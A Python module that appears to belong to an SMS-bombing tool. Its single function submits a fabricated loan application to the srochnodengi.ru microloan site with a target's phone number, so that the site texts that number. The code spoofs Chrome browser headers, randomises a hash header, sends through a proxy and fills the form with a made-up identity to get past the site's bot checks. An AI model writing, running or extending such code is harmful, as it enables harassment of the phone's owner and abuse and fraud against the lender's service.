import requests
from config import Proxy, Services
from utils.email_generate import generate_random_string
import json


def send_sms_to_srochno_dengi(phone_number: str):
    try:
        url = Services.SROCHNODENGI
        random_char = generate_random_string()
        headers = {
            'Accept': 'application/json, text/plain, */*',
            'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
            'Content-Type': 'application/json',
            'Hash': f'1468460a0cab5eac4b07{random_char}9114d0d2bd6b214483f5843c87e4bc672de260a1c734',
            'Origin': 'https://order.srochnodengi.ru',
            'Priority': 'u=1, i',
            'Referer': 'https://order.srochnodengi.ru/',
            'Sec-Ch-Ua': '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
            'Sec-Ch-Ua-Mobile': '?0',
            'Sec-Ch-Ua-Platform': '"Windows"',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-site',
            'Timestamp': '1740887696836',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
            'User-Device': 'Windows 10',
            'User-OS': 'Chrome 133.0.0.0'
        }

        payload = {
          "last_name": "Лев",
          "first_name": "Лев",
          "middle_name": "Михайлович",
          "email": "dsdnqiowdnq@mail.ru",
          "phone": phone_number,
          "birthday": "2003-02-12",
          "documents_open": [],
          "lead": "{\"utm_content\":\"pop\",\"testB\":\"\",\"utm_source\":\"banki\",\"transaction_id\":\"a553187db396a91d97c194313f89669a\",\"amount\":\"8500\",\"term\":\"7\"}"
        }

        proxies = {
            "http": Proxy.PROXY_URL,
            "https": Proxy.PROXY_URL
        }

        response = requests.post(url, headers=headers, proxies=proxies, json=payload)
        return {
            'status_code': response.status_code,
            'response': response.text
        }
    except Exception as error:
        print(error)
        return {
            'status_code': 400
        }